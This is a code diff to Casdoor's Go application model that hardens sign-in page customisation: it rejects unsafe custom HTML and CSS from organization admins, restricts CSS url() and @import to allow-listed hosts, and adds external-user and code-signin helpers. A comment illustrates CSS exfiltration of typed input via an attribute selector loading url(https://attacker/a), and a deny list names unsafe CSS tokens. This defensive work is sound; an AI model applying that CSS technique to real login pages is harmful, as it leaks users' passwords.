@@ -22,6 +22,7 @@ import (
 	"regexp"
 	"strings"
 
+	"github.com/casdoor/casdoor/conf"
 	"github.com/casdoor/casdoor/i18n"
 	"github.com/casdoor/casdoor/util"
 )
@@ -203,6 +204,7 @@ func extendApplicationWithSignupItems(application *Application) (err error) {
 	if len(application.SignupItems) == 0 {
 		application.SignupItems = []*SignupItem{
 			{Name: "ID", Visible: false, Required: true, Prompted: false, Rule: "Random"},
+			{Name: "Logo", Visible: true, Required: false, Prompted: false, Rule: "None"},
 			{Name: "Username", Visible: true, Required: true, Prompted: false, Rule: "None"},
 			{Name: "Display name", Visible: true, Required: true, Prompted: false, Rule: "None"},
 			{Name: "Password", Visible: true, Required: true, Prompted: false, Rule: "None"},
@@ -284,6 +286,8 @@ func GetMaskedApplication(application *Application, userId string) *Application 
 	application.RegistrationAccessToken = "***"
 	application.IpWhitelist = "***"
 	application.BackchannelLogoutUri = "***"
+	application.ExternalUsers = nil
+	application.ExternalGroups = nil
 	application.EnablePassword = false
 	application.EnableSigninSession = false
 	application.EnableCodeSignin = false
@@ -370,6 +374,7 @@ func GetMaskedApplication(application *Application, userId string) *Application 
 		application.OrganizationObj.OrgBalance = -1
 		application.OrganizationObj.UserBalance = -1
 		application.OrganizationObj.BalanceCredit = -1
+		application.OrganizationObj.SecurityPolicy = application.OrganizationObj.SecurityPolicy.getPublic()
 
 		if !isOrgUser {
 			application.OrganizationObj.MfaItems = nil
@@ -468,22 +473,58 @@ func checkMultipleCaptchaProviders(application *Application, lang string) error 
 	return nil
 }
 
-// KeepApplicationCustomHtml restores the custom HTML of application from oldApplication (nil
-// for a new application). The HTML runs as script on Casdoor's own origin, where it acts as
-// whoever opens the page, e.g., a global admin, so only a global admin may change it.
-func KeepApplicationCustomHtml(application *Application, oldApplication *Application) {
+// CheckApplicationCustomHtml keeps what an organization admin may put on the sign-in pages to layout
+// and branding: custom HTML or CSS that could collect or send out what users type is refused unless
+// it is the one oldApplication (nil for a new application) already has. The sign-in pages render the
+// custom HTML of an application with custom scripts enabled as it is, so an organization admin can
+// neither enable them nor change that HTML. A global admin is not held to this.
+func CheckApplicationCustomHtml(application *Application, oldApplication *Application) error {
 	if oldApplication == nil {
 		oldApplication = &Application{}
 	}
 
-	application.HeaderHtml = oldApplication.HeaderHtml
-	application.PageHtml = oldApplication.PageHtml
-	application.FooterHtml = oldApplication.FooterHtml
-	application.FormSideHtml = oldApplication.FormSideHtml
-	application.SigninHtml = oldApplication.SigninHtml
-	application.SignupHtml = oldApplication.SignupHtml
-	application.FormCss = keepSafeCss(application.FormCss, oldApplication.FormCss)
-	application.FormCssMobile = keepSafeCss(application.FormCssMobile, oldApplication.FormCssMobile)
+	if application.EnableCustomScript && !oldApplication.EnableCustomScript {
+		return fmt.Errorf("only a global admin can enable custom scripts of the application")
+	}
+
+	var prefixes []string
+	var unsafeFields []string
+	var scriptFields []string
+	checkHtml := func(field string, text string, oldText string) {
+		if text == oldText || text == "" {
+			return
+		}
+		if application.EnableCustomScript {
+			scriptFields = append(scriptFields, field)
+			return
+		}
+		if prefixes == nil {
+			prefixes = getCssUrlPrefixes()
+		}
+		if !isHtmlSafeFor(text, prefixes) {
+			unsafeFields = append(unsafeFields, field)
+		}
+	}
+	checkCss := func(field string, css string, oldCss string) {
+		if css == oldCss || css == "" {
+			return
+		}
+		if prefixes == nil {
+			prefixes = getCssUrlPrefixes()
+		}
+		if !isCssSafeFor(css, prefixes) {
+			unsafeFields = append(unsafeFields, field)
+		}
+	}
+
+	checkHtml("header HTML", application.HeaderHtml, oldApplication.HeaderHtml)
+	checkHtml("page HTML", application.PageHtml, oldApplication.PageHtml)
+	checkHtml("footer HTML", application.FooterHtml, oldApplication.FooterHtml)
+	checkHtml("side panel HTML", application.FormSideHtml, oldApplication.FormSideHtml)
+	checkHtml("signin HTML", application.SigninHtml, oldApplication.SigninHtml)
+	checkHtml("signup HTML", application.SignupHtml, oldApplication.SignupHtml)
+	checkCss("form CSS", application.FormCss, oldApplication.FormCss)
+	checkCss("form CSS mobile", application.FormCssMobile, oldApplication.FormCssMobile)
 
 	// a custom sign-in item renders its customCss as HTML
 	oldSigninCss := map[string]string{}
@@ -494,9 +535,9 @@ func KeepApplicationCustomHtml(application *Application, oldApplication *Applica
 	}
 	for _, item := range application.SigninItems {
 		if isCustomSigninItem(item) {
-			item.CustomCss = oldSigninCss[item.Name]
+			checkHtml(fmt.Sprintf("signin item \"%s\"", item.Name), item.CustomCss, oldSigninCss[item.Name])
 		} else if item != nil {
-			item.CustomCss = keepSafeCss(item.CustomCss, oldSigninCss[item.Name])
+			checkCss(fmt.Sprintf("signin item \"%s\"", item.Name), item.CustomCss, oldSigninCss[item.Name])
 		}
 	}
 
@@ -513,33 +554,151 @@ func KeepApplicationCustomHtml(application *Application, oldApplication *Applica
 	}
 	for _, item := range application.SignupItems {
 		if isCustomSignupItem(item) {
-			item.Label = oldSignupHtmls[item.Name]
+			checkHtml(fmt.Sprintf("signup item \"%s\"", item.Name), item.Label, oldSignupHtmls[item.Name])
 		}
 		if item != nil {
-			item.CustomCss = keepSafeCss(item.CustomCss, oldSignupCss[item.Name])
+			checkCss(fmt.Sprintf("signup item \"%s\"", item.Name), item.CustomCss, oldSignupCss[item.Name])
 		}
 	}
+
+	if len(scriptFields) > 0 {
+		return fmt.Errorf("the %s of the application runs as it is because custom scripts are enabled, so only a global admin can change it", strings.Join(scriptFields, ", "))
+	}
+	if len(unsafeFields) > 0 {
+		return fmt.Errorf("the %s of the application uses HTML or loads files that this Casdoor only lets a global admin set: scripts, forms and event handlers are not allowed, and images and fonts must come from this Casdoor, its storage providers or a URL in formCssAllowedUrls", strings.Join(unsafeFields, ", "))
+	}
+	return nil
 }
 
-var unsafeCssTokens = []string{"\\", "<", "url(", "@import", "@font-face", "image(", "image-set(", "cross-fade(", "element(", "src("}
+// Form CSS may load images and fonts, but only from places whose access logs an organization
+// admin cannot read: a selector per typed character, e.g.,
+// input[value^="a"] { background: url(https://attacker/a) }, would otherwise send out what users type.
+var unsafeCssTokens = []string{"\\", "<", "image(", "image-set(", "cross-fade(", "element(", "src("}
 
-var reStyleTag = regexp.MustCompile(`(?i)</?style[^>]*>`)
+var cssUrlPrefixes = []string{
+	"https://fonts.googleapis.com/",
+	"https://fonts.gstatic.com/",
+	"https://cdn.jsdelivr.net/gh/casdoor/",
+	"https://cdn.jsdelivr.net/npm/@fontsource/",
+	"https://cdn.jsdelivr.net/npm/@fontsource-variable/",
+	"https://cdn.casbin.org/",
+	"https://cdn.casdoor.com/",
+	"https://cdn.casvisor.com/",
+}
 
-func isCssSafe(css string) bool {
+// a stylesheet pulled in by @import is not checked itself, so it may only come from font services
+// whose stylesheets point at their own font files
+var cssImportPrefixes = []string{
+	"https://fonts.googleapis.com/css",
+	"https://cdn.jsdelivr.net/npm/@fontsource/",
+	"https://cdn.jsdelivr.net/npm/@fontsource-variable/",
+}
+
+var (
+	reStyleTag  = regexp.MustCompile(`(?i)</?style[^>]*>`)
+	reCssUrl    = regexp.MustCompile(`url\(\s*(?:"([^"]*)"|'([^']*)'|([^"'()\s]*))\s*\)`)
+	reCssImport = regexp.MustCompile(`@import\s*(?:url\(\s*)?(?:"([^"]*)"|'([^']*)'|([^"'()\s;]+))`)
+)
+
+// getCssUrlPrefixes adds the operator's own places to the built-in ones: this Casdoor's origin, the
+// global storage providers and the formCssAllowedUrls setting.
+func getCssUrlPrefixes() []string {
+	prefixes := append([]string{}, cssUrlPrefixes...)
+	addPrefix := func(prefix string) {
+		prefix = strings.ToLower(strings.TrimSpace(prefix))
+		if prefix == "" {
+			return
+		}
+		if !strings.Contains(prefix, "://") {
+			prefix = "https://" + prefix
+		}
+		if strings.Count(prefix, "/") < 3 {
+			prefix += "/"
+		}
+		prefixes = append(prefixes, prefix)
+	}
+
+	addPrefix(conf.GetConfigString("origin"))
+	for _, prefix := range strings.Split(conf.GetConfigString("formCssAllowedUrls"), ",") {
+		addPrefix(prefix)
+	}
+	providers, err := GetProvidersByCategory("admin", "Storage")
+	if err == nil {
+		for _, provider := range providers {
+			addPrefix(provider.Domain)
+		}
+	}
+	return prefixes
+}
+
+func getCssUrl(match []string) string {
+	return strings.TrimSpace(match[1] + match[2] + match[3])
+}
+
+func isCssUrlAllowed(cssUrl string, prefixes []string, allowLocal bool) bool {
+	if strings.HasPrefix(cssUrl, "data:") || strings.HasPrefix(cssUrl, "#") {
+		return allowLocal
+	}
+	// browsers drop tabs and newlines from a URL and resolve dot segments, either of which could
+	// turn an allowed-looking URL into another one
+	for _, r := range cssUrl {
+		if r <= ' ' || r == 0x7f {
+			return false
+		}
+	}
+	if strings.Contains(cssUrl, "..") || strings.Contains(cssUrl, "%2e") || strings.Contains(cssUrl, "%2f") || strings.Contains(cssUrl, "%5c") {
+		return false
+	}
+
+	parsed, err := url.Parse(cssUrl)
+	if err != nil {
+		return false
+	}
+	if parsed.Scheme == "" && parsed.Host == "" && !strings.HasPrefix(cssUrl, "//") {
+		return allowLocal
+	}
+	for _, prefix := range prefixes {
+		if strings.HasPrefix(cssUrl, prefix) {
+			return true
+		}
+	}
+	return false
+}
+
+// isCssSafeFor checks css against prefixes, or against getCssUrlPrefixes() when it is nil.
+func isCssSafeFor(css string, prefixes []string) bool {
 	lowerCss := strings.ToLower(reStyleTag.ReplaceAllString(css, ""))
 	for _, token := range unsafeCssTokens {
 		if strings.Contains(lowerCss, token) {
 			return false
 		}
 	}
-	return true
-}
 
-func keepSafeCss(css string, oldCss string) string {
-	if css == oldCss || isCssSafe(css) {
-		return css
+	if !strings.Contains(lowerCss, "url(") && !strings.Contains(lowerCss, "@import") {
+		return true
 	}
-	return oldCss
+
+	// every url( and @import has to be one the patterns read, so none can hide from the check
+	urls := reCssUrl.FindAllStringSubmatch(lowerCss, -1)
+	imports := reCssImport.FindAllStringSubmatch(lowerCss, -1)
+	if len(urls) != strings.Count(lowerCss, "url(") || len(imports) != strings.Count(lowerCss, "@import") {
+		return false
+	}
+
+	if prefixes == nil {
+		prefixes = getCssUrlPrefixes()
+	}
+	for _, match := range urls {
+		if !isCssUrlAllowed(getCssUrl(match), prefixes, true) {
+			return false
+		}
+	}
+	for _, match := range imports {
+		if !isCssUrlAllowed(getCssUrl(match), cssImportPrefixes, false) {
+			return false
+		}
+	}
+	return true
 }
 
 func isCustomSigninItem(item *SigninItem) bool {
@@ -623,6 +782,23 @@ func redirectUriMatchesTarget(redirectUri, targetUri *url.URL) bool {
 	return true
 }
 
+// IsExternalUser reports whether a user of another organization is let to sign in to the application,
+// by being listed in its external users or being a member of one of its external groups.
+func (application *Application) IsExternalUser(user *User) bool {
+	if user.Owner == application.Organization {
+		return false
+	}
+	if util.InSlice(application.ExternalUsers, user.GetId()) {
+		return true
+	}
+	for _, group := range user.Groups {
+		if util.InSlice(application.ExternalGroups, group) {
+			return true
+		}
+	}
+	return false
+}
+
 func (application *Application) IsPasswordEnabled() bool {
 	if len(application.SigninMethods) == 0 {
 		return application.EnablePassword
@@ -688,6 +864,23 @@ func (application *Application) IsMagicLinkSignupEnabled() bool {
 	}
 
 	return false
+}
+
+// NextSignup answers a verification-code sign-in of an email or phone that has no account yet
+const NextSignup = "NextSignup"
+
+// IsCodeSigninSignupEnabled tells whether a verification-code sign-in of an email or phone
+// that has no account may go on to the application's own signup page, which takes the
+// address the code proved and asks for the rest of the signup items
+func (application *Application) IsCodeSigninSignupEnabled(verifyType string) bool {
+	if !application.IsSelfSignupEnabled() || application.SignupUrl != "" {
+		return false
+	}
+
+	if verifyType == VerifyTypeEmail {
+		return application.IsCodeSigninViaEmailEnabled() && application.IsSignupFieldVisible("Email")
+	}
+	return application.IsCodeSigninViaSmsEnabled() && application.IsSignupFieldVisible("Phone")
 }
 
 // IsSelfSignupEnabled tells whether users may sign themselves up on the signup page, by a
